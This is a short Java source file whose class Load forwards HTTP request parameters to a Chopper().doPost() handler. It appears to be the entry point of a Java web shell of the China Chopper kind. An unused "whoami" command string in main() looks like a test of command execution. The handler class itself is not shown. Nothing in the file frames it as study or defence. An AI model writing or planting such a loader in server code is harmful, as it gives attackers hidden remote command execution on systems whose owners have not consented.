package com.lenkee.intersting;

import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

/**
 * Created by amettursun on 2020/2/3.
 */
public class Load {
    public static void main(String[] args) throws IOException {
        String cmd = "whoami";

    }

    public static String load(Map<String,String[]> map){
        try {
            Map<String,String> request = new HashMap<String,String>();
            for (Map.Entry<String, String[]> entrySet : map.entrySet()) {
                String key = entrySet.getKey();
                String value = entrySet.getValue()[0];
                request.put(key, value);
            }
            return new Chopper().doPost(request);
        } catch (IOException ex) {
            return ex.toString();
        }
    }
}
